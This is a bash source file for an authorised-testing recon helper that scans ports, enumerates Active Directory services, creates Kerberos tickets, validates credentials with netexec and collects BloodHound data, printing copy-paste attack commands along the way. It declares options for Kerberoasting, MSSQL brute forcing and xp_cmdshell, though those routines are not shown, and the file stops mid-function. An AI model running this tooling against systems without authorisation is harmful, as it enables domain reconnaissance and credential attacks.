#!/bin/bash

# ==============================================================================
# Bash Recon and Service Enumeration Helper
#
# Purpose:
#   Perform a bounded-concurrency TCP connect scan against a curated service
#   profile, then run optional service-specific enumeration and produce
#   evidence-based findings and suggested next steps.
#
# Implemented capabilities:
#   - Concurrent TCP connect scanning of common infrastructure and AD ports
#   - Optional Nmap service, version, script, and OS detection
#   - Reverse-DNS, LDAP RootDSE, TLS SAN, and HTTP redirect hostname discovery
#   - HTTP/HTTPS redirect analysis, directory enumeration, and VHost discovery
#   - DNS enumeration, AXFR testing, and optional subdomain brute forcing
#   - FTP, SMB, RPC, LDAP/LDAPS, Kerberos, MSSQL, NFS, Docker, Redis,
#     Kubernetes, RDP, WinRM, database, and printer-service checks
#   - Anonymous, guest, and authenticated SMB/LDAP access validation
#   - Optional AS-REP Roasting and Kerberoasting assessment
#   - Optional BloodHound data collection
#   - Optional Active Directory Certificate Services assessment with Certipy
#   - /etc/hosts suggestions, evidence files, recon synopsis, and attack-path
#     hints
#
# Safety:
#   Intended only for systems that you own or are explicitly authorized to test.
#   Potentially intrusive or credentialed checks should remain opt-in.
# ==============================================================================

# ==============================================================================
# TODO / ROADMAP
# ==============================================================================
#
# P0 - Correctness and Credential Safety
# --------------------------------------
# - Fix extract_ssl_info variable mismatch:
#     local PORT=...
#     if [[ "$PORT" -eq 636 ]]; then
# - Either implement certificate CN extraction or document SAN-only extraction.
# - Separate observed facts from inferred risks:
#     OPEN       Port is reachable
#     CONFIRMED  A probe verified a configuration or exposure
#     POSSIBLE   Manual validation is still required
# - Do not label a service vulnerable based only on its port number.
# - Make --no-color disable every color and formatting variable.
#
# P1 - Argument Parsing and Scan Profiles
# ---------------------------------------
# - Replace the current manual argument parser with getopt or a dedicated
#   parse_args function supporting --help and input validation.
# - Add explicit scan profiles:
#     --profile default     Current curated service list
#     --profile web         Web and common alternate-web ports
#     --profile ad          AD, Kerberos, SMB, RPC, LDAP, DNS, and AD CS ports
#     --profile extended    Default profile plus common high ports
# - Avoid a --web scan flag that could be confused with the existing
#   --web-enum enumeration flag.
#
# P1 - Concurrency Hardening
# --------------------------
# - Track every worker PID and collect individual exit statuses.
# - Replace concurrent terminal writes with per-job output files or a result
#   queue, then print results deterministically after wait.
# - Use per-worker result files or locking for shared evidence files.
# - Deduplicate every shared result file after worker completion.
# - Handle SIGINT, SIGTERM, and partial-run cleanup consistently.
# - Make concurrency configurable:
#     --jobs N
#     --connect-timeout SECONDS
# - Add tests for interrupted jobs, failed probes, duplicate results, and
#   malformed targets.
#
# P1 - Reporting and Evidence
# ---------------------------
# - Normalize output sections:
#     Target and scope
#     Open ports
#     Confirmed findings
#     Authentication results
#     Collected evidence
#     Possible attack paths
#     Manual next steps
#     Errors and skipped checks
# - Add machine-readable output:
#     --output-dir DIR
#     --format text|json|jsonl
# - Attach evidence and confidence to each finding.
# - Keep sensitive evidence outside the repository by default.
#
# P1 - Attack-Path Decision Engine
# --------------------------------
# - Generate paths only from verified prerequisites, not port combinations.
# - Add confidence levels and missing prerequisites to every suggestion.
# - Avoid claiming that an attack is viable solely because a hash, SPN, or
#   service port was found.
# - Distinguish:
#     discovery opportunity
#     credential-access opportunity
#     authenticated remote-service opportunity
#     privilege-escalation opportunity
# - Require explicit confirmation before running intrusive actions.
#
# P2 - CVE and MITRE ATT&CK Mapping
# ---------------------------------
# - Rename static "CVE hints" to "attack-surface hints."
# - Show a CVE only when service/version/configuration evidence matches.
# - Include the evidence that caused each mapping.
# - Map confirmed behavior rather than open ports:
#     SMB relay/name-resolution poisoning  -> T1557.001
#     SMB admin-share remote access        -> T1021.002
#     WinRM remote access                  -> T1021.006
#     Kerberoasting                        -> T1558.003
#     AS-REP Roasting                      -> T1558.004
# - Keep ATT&CK mappings in a data structure rather than scattered strings.
#
# P2 - Assessment Workflow
# ------------------------
# - Organize the final workflow as:
#     discovery
#     service enumeration
#     authentication validation
#     vulnerability validation
#     evidence collection
#     attack-path analysis
#     cleanup and reporting
# - Avoid branding the output as "OSCP-style"; 
#
# ==============================================================================

set -euo pipefail

START_TIME=$(date +%s)

DEFAULT_TARGET="127.0.0.1"
AUTH_USER_DN=""
declare -a AUTH_USER_GROUP_DNS=()
declare -a AUTH_USER_GROUP_NAMES=()
TARGET=""
TARGET_IPV4=""
TARGET_FQDN=""
DOMAIN_CONTROLLER=""
DOMAIN_SID=""
ENABLE_VHOST=false
ENABLE_MSSQL_BRUTE=false
ENABLE_MSSQL_ENUM=false
ENABLE_KERB_ENUM=false
ENABLE_WEB_ENUM=false
ENABLE_BH_EXPORT=false
ENABLE_KERBROAST=false
KERBEROS_FOUND=false
NTLM_ENABLED=false
NTLM_TIME_SYNC_NOTE_SHOWN=false
MSSQL_NULL_LOGIN=false
MSSQL_AUTH_OK=false
MSSQL_LCLAUTH_OK=false
MSSQL_INSTANCE_FOUND=false
MSSQL_PRIVESC=false
MSSQL_IMPERSONATE=false
MSSQL_PRIV_CHECKED=false
MSSQL_IMPERSONATION_FOUND=false
MSSQL_IMPERSONATION_TARGETS=""
MSSQL_DBOWNER_PRIVESC_FOUND=false
MSSQL_PRIVESC_PATH_FOUND=false
MSSQL_PRIVESC_ATTEMPTED=false
MSSQL_PRIVESC_OK=false
MSSQL_SYSADMIN=false
MSSQL_PRIVESC_MODE=""
MSSQL_CMDSHELL_CHECKED=false
MSSQL_CMDSHELL_ENABLE_ATTEMPTED=false
MSSQL_CMDSHELL_ENABLE_OK=false
MSSQL_CMDSHELL_ALREADY_ENABLED=false
MSSQL_CMDSHELL_PERMISSION_DENIED=false
MSSQL_CMDSHELL_ENABLE_FAILED=false
MSSQL_CMDSHELL_ERROR=""
MSSQL_USER=""
LDAP_FOUND=false
LDAP_ENUM_DONE=false
LDAP_ANON_BIND=false
LDAP_GUEST_BIND=false
LDAP_AUTH_BIND=false
FTP_ANON_OK=false
FTP_AUTH_OK=false
SMB_GUEST_OK=false
SMB_NULL_OK=false
SMB_AUTH_OK=false
LDAP_BASE_DN=""
LDAP_DOMAIN=""
LDAP_BIND_TYPE=""
RPC_ANON_OK=false
RPC_GUEST_OK=false
RPC_AUTH_OK=false
MSRPC_ANON_OK=false
RPC_ATTACK_MAP_FOUND=false
SMB_FOUND=false
SMB_ENUM_DONE=false
SMB_V1=false
SMB_V2=false
SMB_V3=false
SMB_SIGNING=false
NO_COLOR=false
KERBEROAST_FILE=""
KERBEROAST_OUT=""
KERB_DETECTED=false
KERB_ENUM_DONE=false
KERB_REALM=""
USERS_FILE=""
PRIV_USERS_FILE=""
WMI_AUTH_OK=false
PSEXEC_AUTH_OK=false
DC_AUTH_OK=0
LAPS_READABLE=false
WEB_DETECTED=false
WINRM_DETECTED=false
SSH_DETECTED=false
ASREP_OK=false
KERBEROS_AUTH_OK=false
HAS_WEB=0
HTTP_FOUND=false
HTTPS_FOUND=false
ADCS_VULNERABLE=false
ENABLE_ADCS=false
MAQ_ENABLED=false
ADCS_SERVICE_DETECTED=false
MACHINE_ACCOUNT_QUOTA=-1
CAN_JOIN_COMPUTERS_TO_DOMAIN=false
HAS_WRITABLE_COMPUTER_ACL=false
DACL_AUDIT_DIR=""
DACL_INTERESTING_FILE=""
DACL_INTERESTING_COUNT=0
BLOODYAD_AUDIT_DIR=""
BLOODYAD_WRITABLE_FILE=""
BLOODYAD_WRITABLE_COUNT=0
RBCD_AUDIT_DONE=false
RBCD_PARSE_OK=false
# Candidate ACE exists, but its trustee may not belong to the current user.
RBCD_CANDIDATE_FOUND=false
# Trustee matched AUTH_USER, Authenticated Users, Everyone,
# or one of AUTH_USER_GROUP_NAMES.
RBCD_APPLICABLE_ACL=false
declare -a RBCD_APPLICABLE_TRUSTEES=()
BADSUCCESSOR_CHECK_DONE=false
BADSUCCESSOR_DC_2025=false
DC_VERSION_FOUND=false
DC_DNS_HOSTNAME=""
DC_OPERATING_SYSTEM=""
DC_OPERATING_SYSTEM_VERSION=""
DC_BUILD_NUMBER=""
DC_VERSION_EVIDENCE=""
DC_DISTINGUISHED_NAMES=()
DC_DNS_HOSTNAMES=()
DC_OPERATING_SYSTEMS=()
DC_OPERATING_SYSTEM_VERSIONS=()
DC_BUILD_NUMBERS=()
BADSUCCESSOR_CANDIDATES_FOUND=false
BADSUCCESSOR_APPLICABLE=false
BADSUCCESSOR_EVIDENCE=""
declare -a BADSUCCESSOR_APPLICABLE_TRUSTEES=()
KERBEROAST_HASH_FOUND=false     # Set when Kerberoast output is non-empty
SPN_NAME=""                     # Parse from Kerberoast result
KERBEROAST_USER=""
declare -a KERBEROAST_TARGETS=()
declare -a SPN_LIST=()
declare -a SPN_USER_LIST=()
BH_ZIP_FILE=""
ENABLE_DNS_ENUM=false
DNS_BRUTE=false
DNS_AXFR=true
DNS_WORDLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
DNS_DOMAIN=""
DNS_ENUM_DONE=false
DNS_FOUND=false
DNS_ZONE_XFER_OK=false
DNS_LOOT_FILE=""
DNS_AXFR_FILE=""
ENABLE_SERVICE_DETECT=false
NFS_FOUND=false
NFS_ENUM_DONE=false
NFS_EXPORTS_FOUND=false
NFS_WORLD_EXPORT=false
NFS_EXPORTS_FILE=""
NFS_LOOT_DIR=""


# --------- Certificate Services / AD CS ----------
HAS_CERTIPY=0
ADCS_TEMPLATES=()
CERTIPY_OUTPUT=""

# Privilges
FOUND_ESCALATION_PRIVS=()

# --- Passing in User Info -----
AUTH_USER=""
AUTH_PASS=""
AUTH_DOMAIN=""
CREDS_PROVIDED=false

# --------- Concurrency ----------
MAX_JOBS=20

declare -a ATTACK_PATHS=()

# --------- Colors ----------
# ---- Base ----
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
MAGENTA="\033[0;35m"
CYAN="\033[0;36m"
GRAY="\033[0;90m"
# ---- Bright / Emphasis ----
BRED="\033[1;31m"
BGREEN="\033[1;32m"
BYELLOW="\033[1;33m"

RESET="\033[0m"

# --------- Temporary Files ----------
HINT_FILE=$(mktemp)
HOSTS_FILE=$(mktemp)
DISCOVERED_HOSTS=$(mktemp)
REDIRECT_HOSTS=$(mktemp)
HTTP_MARKER=$(mktemp)
HTTPS_MARKER=$(mktemp)
SMB_MARKER=$(mktemp)
KERB_MARKER=$(mktemp)
LDAP_MARKER=$(mktemp)
OPEN_PORTS_FILE=$(mktemp)

trap 'rm -f "$HINT_FILE" "$HOSTS_FILE" "$DISCOVERED_HOSTS" "$REDIRECT_HOSTS" \
          "$HTTP_MARKER" "$HTTPS_MARKER" "$SMB_MARKER" "$KERB_MARKER" "$LDAP_MARKER" \
          "$OPEN_PORTS_FILE"' EXIT

# --------- Argument Parsing ----------
for arg in "$@"; do
    case "$arg" in
        --no-color) NO_COLOR=true ;;
        --vhost) ENABLE_VHOST=true ;;
        --kerb-enum) ENABLE_KERB_ENUM=true ;;
        --user=*) AUTH_USER="${arg#*=}" ;;
        --username=*) AUTH_USER="${arg#*=}" ;;
        --pass=*) AUTH_PASS="${arg#*=}" ;;
        --password=*) AUTH_PASS="${arg#*=}" ;;
        -u=*) AUTH_USER="${arg#*=}" ;;
        -p=*) AUTH_PASS="${arg#*=}" ;;
        --domain=*) AUTH_DOMAIN="${arg#*=}" ;;
        --web-enum) ENABLE_WEB_ENUM=true ;;
        --run-blood) ENABLE_BH_EXPORT=true ;;
        --kerberoast) ENABLE_KERBROAST=true ;;
        --check-certs) ENABLE_ADCS=true ;;
        --check-cert) ENABLE_ADCS=true ;;
        --check-ca) ENABLE_ADCS=true ;;
        --check-mssql) ENABLE_MSSQL_ENUM=true ;;
        --mssql-brute) ENABLE_MSSQL_BRUTE=true ;;
        --service-detect) ENABLE_SERVICE_DETECT=true ;;
	--svc) ENABLE_SERVICE_DETECT=true ;;
        --dns-enum) ENABLE_DNS_ENUM=true ;;
        --dns-brute) ENABLE_DNS_ENUM=true DNS_BRUTE=true ;;
        --dns-no-axfr) DNS_AXFR=false;;
        --dns-domain=*) 
            DNS_DOMAIN="${arg#*=}" 
            ENABLE_DNS_ENUM=true 
        ;;
        --dns-wordlist=*) 
            DNS_WORDLIST="${arg#*=}" 
            ENABLE_DNS_ENUM=true 
            DNS_BRUTE=true 
        ;;
        *) [ -z "$TARGET" ] && TARGET="$arg" ;;
    esac
done

# Strip leading whitespace
AUTH_USER="${AUTH_USER##*([[:space:]])}"
# Strip trailing whitespace
AUTH_USER="${AUTH_USER%%*([[:space:]])}"


if [ -n "$AUTH_DOMAIN" ] && [ -z "$LDAP_DOMAIN" ]; then
    LDAP_DOMAIN="${AUTH_DOMAIN,,}"
fi

[ -z "$TARGET" ] && TARGET="$DEFAULT_TARGET" && echo "[i] No IP provided — defaulting to $TARGET"

$NO_COLOR && GREEN="" YELLOW="" RED="" BLUE="" RESET=""

# 🔥  High risk
# 💥  Critical exposure
# ☠   Dangerous
# 🚨  Alert
# 🛠  Tooling
# ⚙   Configuration
# 📌  Note
# ➡   Next step

# --------- Icons (UTF-8 with ASCII fallback) ----------
ICON_OK="✔"
ICON_WARN="⚠"
ICON_INFO="ℹ"
ICON_RISK="🔥"
ICON_ALERT="🚨"
ICON_CRIT="💥"
ICON_SCAN="🔍"
ICON_SHARE="📁"
ICON_WEB="🌐"
ICON_USER="👤"
ICON_TIP="💡"
ICON_PIN="📌"

# ASCII fallback for non-UTF8 terminals
if [[ "${LANG:-}" != *UTF-8* && "${LC_ALL:-}" != *UTF-8* ]]; then
    ICON_OK="[+]"
    ICON_WARN="[!]"
    ICON_INFO="[i]"
    ICON_RISK="[!!]"
    ICON_ALERT="[?]"
    ICON_CRIT="[!!!]"
    ICON_SCAN="[scan]"
    ICON_SHARE="[share]"
    ICON_WEB="[web]"
    ICON_USER="[user]"
    ICON_TIP="[TIP]"
    ICON_PIN="[O--]"
fi

echo
echo "Legend:"
echo "---------------------------"
echo "  $ICON_OK   Open / Success"
echo "  $ICON_WARN   Interesting / Needs Review"
echo "  $ICON_RISK  High-Risk Exposure"
echo "  $ICON_INFO   Informational"
echo "  $ICON_SCAN  Scanning / Enumeration"
echo "  $ICON_SHARE  File Shares / Storage"
echo "  $ICON_WEB  Web Services"
echo "  $ICON_USER  Users / Identities"
echo "  $ICON_TIP  Tip/Copyable Commands"
echo "---------------------------"

# --------- Message Helpers ----------
info()      { echo -e "${BLUE}ℹ ${RESET} $*"; }
success()   { echo -e "${GREEN}${ICON_OK} ${RESET} $*"; }
notify()    { echo -e "${YELLOW}${ICON_WARN} ${RESET} $*"; }
note()      { echo -e "${BLUE}${ICON_PIN} ${RESET} $*"; }
finding()   { echo -e "${YELLOW}[?] ${RESET} $*"; }
warn()      { echo -e "${RED}✖ ${RESET} $*"; }
error()      { echo -e "${RED}[ERROR]:${RESET} $*"; }
risk()      { echo -e "${RED}[!] ${RESET} $*"; }
high_risk() { echo -e "${RED}${ICON_RISK} ${RESET} ${RED}$*${RESET}"; }
critical()  { echo -e "${RED}${ICON_CRIT} ${RESET} ${RED}$*${RESET}"; }
danger()    { echo -e "${RED}☠ ${RESET} $*"; }
alert()     { echo -e "${RED}${ICON_ALERT} ${RESET} $*"; }
lightbulb() { echo -e "${YELLOW}${ICON_TIP} ${RESET} $*"; }

is_ipv4() {
    [[ "${1:-}" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
}

########################################
# Reporting / Command Artifact Helpers
########################################
sanitize_name() {
    local value="${1:-target}"
    value="${value//[^A-Za-z0-9_.-]/_}"
    printf '%s' "${value:-target}"
}

init_artifacts() {
    local safe_target
    safe_target="$(sanitize_name "${TARGET_IPV4:-$TARGET}")"

    ARTIFACT_ROOT="${ARTIFACT_ROOT:-recon_${safe_target}}"
    COMMANDS_DIR="$ARTIFACT_ROOT/commands"
    EVIDENCE_DIR="$ARTIFACT_ROOT/evidence"
    LOOT_DIR="$ARTIFACT_ROOT/loot"
    REPORTS_DIR="$ARTIFACT_ROOT/reports"

    mkdir -p "$COMMANDS_DIR" "$EVIDENCE_DIR" "$LOOT_DIR" "$REPORTS_DIR"

    REPEATABLE_COMMANDS_FILE="$COMMANDS_DIR/repeatable_commands.txt"
    ATTACK_PATH_REPORT="$REPORTS_DIR/attack_path_engine.txt"
    LOOT_INDEX_FILE="$LOOT_DIR/loot_index.txt"

    : > "$REPEATABLE_COMMANDS_FILE"
    : > "$ATTACK_PATH_REPORT"
    : > "$LOOT_INDEX_FILE"

    {
        echo "# Repeatable commands for report generation"
        echo "# Target: ${TARGET_IPV4:-$TARGET}"
        echo "# Generated: $(date -Is)"
        echo
    } >> "$REPEATABLE_COMMANDS_FILE"

    {
        echo "# Attack Path Engine"
        echo "# Target: ${TARGET_IPV4:-$TARGET}"
        echo "# Generated: $(date -Is)"
        echo
    } >> "$ATTACK_PATH_REPORT"

    success "Artifact directories initialized under: ${BYELLOW}$ARTIFACT_ROOT${RESET}"
}

record_loot() {
    local kind="${1:-loot}"
    local value="${2:-}"
    local evidence="${3:-}"

    [[ -z "$value" || -z "${LOOT_INDEX_FILE:-}" ]] && return 0

    {
        echo "[$kind] $value"
        [[ -n "$evidence" ]] && echo "  evidence: $evidence"
        echo
    } >> "$LOOT_INDEX_FILE"
}

record_command() {
    local section="${1:-General}"
    local description="${2:-Command}"
    local command_text="${3:-}"

    [[ -z "$command_text" || -z "${REPEATABLE_COMMANDS_FILE:-}" ]] && return 0

    {
        echo "## [$section] $description"
        echo "$command_text"
        echo
    } >> "$REPEATABLE_COMMANDS_FILE"
}

service_version_detection() {
    local target="$1"
    local ports_csv

    if ! command -v nmap >/dev/null 2>&1; then
        warn "nmap not found — skipping service/version detection"
        return 1
    fi

    if [ ! -s "$OPEN_PORTS_FILE" ]; then
        warn "No open ports available for service/version detection"
        return 1
    fi

    ports_csv=$(sort -n "$OPEN_PORTS_FILE" | paste -sd, -)

    echo
    echo -e "${BLUE}========================================${RESET}"
    echo -e "${BYELLOW} Service / Version / OS Detection ${RESET}"
    echo -e "${BLUE}========================================${RESET}"

    info "Running targeted nmap service detection against open ports only"
    echo -e " ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e " ${GREEN}nmap -sC -sV -O --osscan-guess -p $ports_csv $target${RESET}"

    nmap -sC -sV -O --osscan-guess -p "$ports_csv" "$target" \
        -oN "nmap_service_${target}.txt" \
        2>/dev/null | tee "nmap_service_${target}.screen.txt"

    echo
    success "Saved full nmap output to: nmap_service_${target}.txt"

    echo
    info "Parsed service summary:"
    awk '
        /^PORT[[:space:]]+STATE[[:space:]]+SERVICE/ {print; show=1; next}
        show && /^[0-9]+\/tcp[[:space:]]+open/ {print}
        /^Service Info:/ {print}
        /^OS details:/ {print}
        /^Aggressive OS guesses:/ {print}
    ' "nmap_service_${target}.txt"
}

get_preferred_dc_host() {
    # Prefer a Kerberos/SPN-safe hostname. Certipy Kerberos checks should not target a raw IP.
    # Priority: LDAPS SAN/RootDSE DC host -> resolved FQDN -> original hostname -> domain -> IP fallback.
    local fallback_ip="${1:-$TARGET_IPV4}"
    local candidate

    for candidate in "${DOMAIN_CONTROLLER:-}" "${TARGET_FQDN:-}" "${ORIGINAL_HOSTNAME:-}"; do
        if [[ -n "$candidate" ]] && ! is_ipv4 "$candidate"; then
            echo "$candidate"
            return 0
        fi
    done

    if [[ -n "${LDAP_DOMAIN:-}" ]] && ! is_ipv4 "$LDAP_DOMAIN"; then
        echo "$LDAP_DOMAIN"
        return 0
    fi

    if [[ -n "${AUTH_DOMAIN:-}" ]] && ! is_ipv4 "$AUTH_DOMAIN"; then
        echo "$AUTH_DOMAIN"
        return 0
    fi

    echo "$fallback_ip"
}

print_ntlm_kerberos_time_sync_note() {
    # Kerberos failures after NTLM is disabled are commonly caused by clock skew.
    # Show this once to avoid noisy output from repeated SMB/LDAP fallbacks.
    local dc_hint="${1:-}"
    local dc_host

    if [[ "${NTLM_TIME_SYNC_NOTE_SHOWN:-false}" == true ]]; then
        return 0
    fi

    dc_host="$(get_preferred_dc_host "$dc_hint")"
    [[ -z "$dc_host" ]] && dc_host="$TARGET_IPV4"

    echo
    lightbulb "NTLM is disabled. Kerberos is time-sensitive; sync Kali's clock with the DC if Kerberos auth fails."
    echo -e "        ${GREEN}sudo ntpdate -u '$dc_host'${RESET}"
    echo -e "        ${GREEN}while true; do sudo ntpdate -u '$dc_host'; sleep 2; done${RESET}"
    echo

    NTLM_TIME_SYNC_NOTE_SHOWN=true
}

kerberos_ccache_reminder() {
    local domain_lc domain_uc dc_host ccache_file

    domain_lc="${LDAP_DOMAIN:-$AUTH_DOMAIN}"
    domain_lc="${domain_lc,,}"
    domain_uc="${domain_lc^^}"

    dc_host="${DOMAIN_CONTROLLER:-$TARGET_FQDN}"
    if [[ -z "$dc_host" || "$dc_host" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        dc_host="$domain_lc"
    fi

    ccache_file="${AUTH_USER}.ccache"

    echo
    alert "Kerberos ticket / ccache reminder"
    echo "  --------------------------------------"
    note "NTLM may be disabled or unreliable. Generate a local Kerberos ticket before Certipy, BloodHound, Evil-WinRM, or Impacket Kerberos commands."
    echo
    echo -e "     ${YELLOW}${ICON_TIP} Copy/Paste:${RESET}"
    echo -e "        ${GREEN}sudo ntpdate -u '$dc_host'${RESET}"
    echo -e "        ${GREEN}rm -f ./*.ccache${RESET}"
    echo -e "        ${GREEN}impacket-getTGT '${domain_lc}/${AUTH_USER}:${AUTH_PASS}' -dc-ip '${TARGET_IPV4}'${RESET}"
    echo -e "        ${GREEN}export KRB5CCNAME=\"\$(pwd)/${ccache_file}\"${RESET}"
    echo -e "        ${GREEN}klist${RESET}"
    echo
    note "Aggressive HTB/lab time-sync loop:"
    echo -e "        ${GREEN}while true; do sudo ntpdate -u '$dc_host'; sleep 2; done${RESET}"
    echo
}

create_local_kerberos_ccache() {
    local domain_lc domain_uc ccache_file principal

    if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" || -z "${LDAP_DOMAIN:-}" || -z "${TARGET_IPV4:-}" ]]; then
        warn "Missing AUTH_USER, AUTH_PASS, LDAP_DOMAIN, or TARGET_IPV4 — cannot create Kerberos ccache"
        return 1
    fi

    domain_lc="${LDAP_DOMAIN,,}"
    domain_uc="${LDAP_DOMAIN^^}"
    ccache_file="$(pwd)/${AUTH_USER}.ccache"
    principal="${AUTH_USER}@${domain_uc}"

    info "Creating local Kerberos ccache for ${principal}"
    echo -e "     ${YELLOW}${ICON_TIP} Copy/Paste equivalent:${RESET}"
    echo -e "        ${GREEN}printf '%s\n' '$AUTH_PASS' | kinit -c '$ccache_file' '$principal'${RESET}"
    echo 
    echo -e "     ${YELLOW}${ICON_TIP} Copy/Paste equivalent:${RESET}"
    echo -e "        ${GREEN}export KRB5CCNAME=$ccache_file${RESET}"

    rm -f "$ccache_file"

    if printf '%s\n' "$AUTH_PASS" | kinit -c "$ccache_file" "$principal"; then
        export KRB5CCNAME="$ccache_file"
        success "Kerberos ccache created: $KRB5CCNAME"
        klist -c "$KRB5CCNAME"
        return 0
    fi

    warn "kinit failed. Try Impacket manually:"
    echo -e "        ${GREEN}impacket-getTGT '${domain_lc}/${AUTH_USER}:${AUTH_PASS}' -dc-ip '${TARGET_IPV4}'${RESET}"
    echo -e "        ${GREEN}export KRB5CCNAME=\"\$(pwd)/${AUTH_USER}.ccache\"${RESET}"
    return 1
}

ORIGINAL_HOSTNAME=""
resolve_hostname_to_ip() {
    local input="$1"
    local resolved_ip
    info "Attempting to Resolve: '$input'"
    
    # If it's an IP address
    if [[ "$input" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        #TARGET="$input"
        info "   [DEBUG] IPV4 Detected"
        # First attempt: getent (respects /etc/hosts)
        ORIGINAL_HOSTNAME=$(getent hosts "$input" | awk '{print $2}' | head -n 1 || echo "")
        info "   [DEBUG] ORIGINAL_HOSTNAME: '$ORIGINAL_HOSTNAME'"
        # Fallback to dig if getent fails
        if [ -z "$ORIGINAL_HOSTNAME" ]; then
            ORIGINAL_HOSTNAME=$(dig +short -x "$input" | sed 's/\.$//' | head -n 1)
        fi

        if [ -n "$ORIGINAL_HOSTNAME" ]; then
            info "Reverse DNS for ${CYAN}$TARGET${RESET} resolved to: ${GREEN}$ORIGINAL_HOSTNAME${RESET}"
            echo "$input $ORIGINAL_HOSTNAME" >> "$HOSTS_FILE"
            echo "$ORIGINAL_HOSTNAME" >> "$DISCOVERED_HOSTS"
        else
            notify "No reverse DNS entry found for IP: ${YELLOW}$TARGET${RESET}"
        fi
        TARGET_IPV4="$input"
        notify "Set TARGT_IPV4 to:  '$TARGET_IPV4'"
        return 0
    fi

    # Try to resolve the hostname
    resolved_ip=$(getent hosts "$input" | awk '{ print $1 }')

    if [ -z "$resolved_ip" ]; then
        error "Could not resolve hostname: $input"
        exit 1
    fi
    
    info "Resolved hostname ${CYAN}$input${RESET} to IP: ${GREEN}$resolved_ip${RESET}"

    # Save original hostname for Kerberos/SPN logic if needed
    ORIGINAL_HOSTNAME="$input"
    TARGET_FQDN="$ORIGINAL_HOSTNAME"
    TARGET="$resolved_ip"
    TARGET_IPV4="$resolved_ip"
    notify "Set TARGET_FQDN to: '$TARGET_FQDN'"
    notify "Set TARGT_IPV4 to:  '$TARGET_IPV4'"
}


dc_auth_check() {
    local user="$1"
    local pass="$2"
    local domain="$3"
    local dc="$4"
    info "Starting DC Auth Check..."
    ########################################
    # Tool Resolution
    ########################################
    local LDAP_TOOL

    if command -v netexec >/dev/null 2>&1; then
        LDAP_TOOL="netexec"
    elif command -v crackmapexec >/dev/null 2>&1; then
        LDAP_TOOL="crackmapexec"
    else
        return 1
    fi

    ########################################
    # Credential Validation Only
    ########################################
    if [[ "$NTLM_ENABLED" == true ]]; then
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap '$dc' -u '$user' -p '$pass' -d '$domain' --no-bruteforce --continue-on-success${RESET}"
        OUT=$($LDAP_TOOL ldap "$dc" \
            -u "$user" \
            -p "$pass" \
            -d "$domain" \
            --no-bruteforce \
            --continue-on-success \
        2>&1)
    else
        info "   - N Using Kerberos..."
        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "        ${GREEN}$LDAP_TOOL ldap '$dc' -u '$user' -p '$pass' -d '$domain' -k --no-bruteforce --continue-on-success${RESET}"
        OUT=$($LDAP_TOOL ldap "$dc" \
            -u "$user" \
            -p "$pass" \
            -d "$domain" -k \
            --no-bruteforce \
            --continue-on-success \
        2>&1)
    fi

    ########################################
    # Success Detection
    ########################################
    if echo "$OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
        return 0
    fi

    return 1
}

gather_bloodhound() {
    info "Starting BloodHound data collection..."
    
    if [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" ]]; then
        warn "No credentials available — skipping BloodHound collection"
        return 1
    fi

    if [[ -z "${LDAP_DOMAIN:-}" ]]; then
        warn "LDAP domain not identified — skipping BloodHound collection"
        return 1
    fi

    if ! command -v bloodhound-python >/dev/null 2>&1; then
        error "Command 'bloodhound-python' not found" 
        return 1
    fi
    # Record start time
    BH_START_TS=$(date +%s)
    BH_OUT_DIR="bloodhound_${TARGET}"
    if [[ -d "$BH_OUT_DIR" ]]; then
        info "BloodHound output directory already exists: $BH_OUT_DIR"
    else
        mkdir -p "$BH_OUT_DIR"
        success "Created BloodHound output directory: $BH_OUT_DIR"
    fi
    
    BH_AUTH_METHOD="auto"
    if [[ "$NTLM_ENABLED" == false ]]; then
        BH_AUTH_METHOD="kerberos"
    fi 
    
    info "BloodHound parameters:"
    echo "   - User:     $AUTH_USER"
    echo "   - Pass:     $AUTH_PASS"
    echo "   - Domain:   $LDAP_DOMAIN"
    echo "   - DC:       $LDAP_DOMAIN"
    echo "   - DC IP:    $TARGET_IPV4"
    #echo "   - Output:   $BH_OUT_DIR"
    echo "   - ns        $TARGET_IPV4"
    echo "   --auth-method:  $BH_AUTH_METHOD"

    info "Gathering domain info via Bloodhound (May Take Some Time)..."
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "        ${GREEN}bloodhound-python -u '$AUTH_USER' -p '$AUTH_PASS' -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method $BH_AUTH_METHOD -c All --zip ${RESET}"
    
    # ---- Capture output while displaying it ----
    BH_LOG=$(mktemp)
    
    bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method $BH_AUTH_METHOD \
        -c All \
        --zip \
        2>&1 | tee "$BH_LOG"

    BH_RC=${PIPESTATUS[0]}

    if [[ $BH_RC -ne 0 ]]; then
        error "BloodHound collection failed (exit code: $BH_RC)"
        echo
        warn "Last BloodHound output:"
        tail -n 20 "$BH_LOG" | sed 's/^/   /'
        rm -f "$BH_LOG"
        return 1
    fi

    success "BloodHound data collected successfully!"

    BH_ZIP_FILE=$(
        find . -maxdepth 1 -name '*_bloodhound.zip' -type f \
            -newermt "@$BH_START_TS" \
            -printf '%T@ %p\n' \
            | sort -nr \
            | awk 'NR==1 {print $2}'
    )

    if [[ -n "$BH_ZIP_FILE" ]]; then
        info "Upload this file to BloodHound:"
        echo -e "   ${BYELLOW}${BH_ZIP_FILE#./}${RESET}"
    else
        warn "No BloodHound ZIP file found from this run"
    fi
}

# --------- SSL Certificate Extraction ----------
extract_ssl_info() {
    set +e  # Disable exit-on-error for this function
    local HOST=$1
    local PORT=${2:-443}

    info "Extracting SSL certificate from $HOST:$PORT..."

    # Retrieve the SSL certificate
